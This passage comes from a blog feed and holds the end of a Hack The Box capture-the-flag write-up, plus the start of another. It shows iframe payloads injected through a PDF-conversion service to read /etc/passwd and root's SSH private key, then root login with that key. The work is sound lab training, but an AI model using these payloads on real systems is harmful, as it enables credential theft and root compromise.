+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# create the table&lt;/span&gt;
+aws dynamodb create-table &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566
+
+&lt;span class=&quot;c&quot;&gt;# add a test item&lt;/span&gt;
+aws dynamodb put-item &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;:{&quot;S&quot;:&quot;Ransomware&quot;},&quot;data&quot;:{&quot;S&quot;:&quot;TestString&quot;}}'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And upon re-sending out POST request, a “result.pdf” file is now on the host:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210423194028.png&quot; alt=&quot;Pasted image 20210423194028&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210423194154.png&quot; alt=&quot;Pasted image 20210423194154&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We also note that these file are owned by &lt;strong&gt;root&lt;/strong&gt;, which make this PDF conversion a good target for further escalation.&lt;/p&gt;
+
+&lt;h3 id=&quot;exploiting-pdf-conversion&quot;&gt;Exploiting PDF Conversion&lt;/h3&gt;
+
+&lt;h4 id=&quot;adapting-code-for-easier-exploitation&quot;&gt;Adapting code for easier exploitation&lt;/h4&gt;
+
+&lt;p&gt;Before starting, we change our attack vector a little to allow easier injection process, mainly by bundling up a few command together and externalising the data to be inserted into its own json file, which can be included in the command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# create the table&lt;/span&gt;
+aws dynamodb create-table &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566
+
+&lt;span class=&quot;c&quot;&gt;# add load the json payload&lt;/span&gt;
+aws dynamodb put-item &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; file://exploit.json &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566 
+
+&lt;span class=&quot;c&quot;&gt;# create the pdf&lt;/span&gt;
+curl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'action=get_alerts'&lt;/span&gt; 127.0.0.1:8000
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;getting-lfi&quot;&gt;Getting LFI&lt;/h4&gt;
+
+&lt;p&gt;We attempt first a basic LFI by attempting to include the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file in the pdf with the following payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;iframe src=file:///etc/passwd&amp;gt;&amp;lt;/iframe&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And by running the steps above, we have a POC we are able to use LFI as root:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425005137.png&quot; alt=&quot;Pasted image 20210425005137&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;privilege-escalation-to-root&quot;&gt;Privilege Escalation to root&lt;/h4&gt;
+
+&lt;p&gt;Using the LFI we found above, we first try to see if any &lt;strong&gt;ssh private keys&lt;/strong&gt; would be present in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/id_rsa&lt;/code&gt; and adapt our payload to the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;iframe src=file:///root/.ssh/id_rsa&amp;gt;&amp;lt;/iframe&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And running the attack again, we get a private key dumped:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425010221.png&quot; alt=&quot;Pasted image 20210425010221&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We copy the content of this file into a local file, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600&lt;/code&gt; it and attempt to &lt;strong&gt;ssh&lt;/strong&gt; in as root using this key.&lt;/p&gt;
+
+&lt;p&gt;:warning: &lt;em&gt;The process of formatting the key to a valid format was somewhat tedious; manual copy-paste didn’t keep line breaks. After some &lt;strong&gt;sed&lt;/strong&gt; and trial-and-error, we finally managed to get it formatted, although there must be a more automatic way to format it properly.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We are able to successfully login as root and get the :black_flag: &lt;strong&gt;root.txt&lt;/strong&gt; :black_flag: flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425012911.png&quot; alt=&quot;Pasted image 20210425012911&quot; /&gt;&lt;/p&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html"></summary></entry><entry><title type="html">HTB Writeup - Ready</title><link href="/posts/HTB-Writeup-Ready" rel="alternate" type="text/html" title="HTB Writeup - Ready" /><published>2021-03-31T01:18:00+02:00</published><updated>2021-03-31T01:18:00+02:00</updated><id>/posts/HTB-Writeup:-Ready</id><content type="html" xml:base="/posts/HTB-Writeup-Ready">&lt;p&gt;A fun and well made box, where 80% of the time was spent enumerating and the remaining 20% split on easy foothold and root privesc.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution, I find this method of writing good for self-education purposes. In fact, I try to write in the order I did everything, so you might see me bouncing back and forth between services.&lt;/p&gt;
 
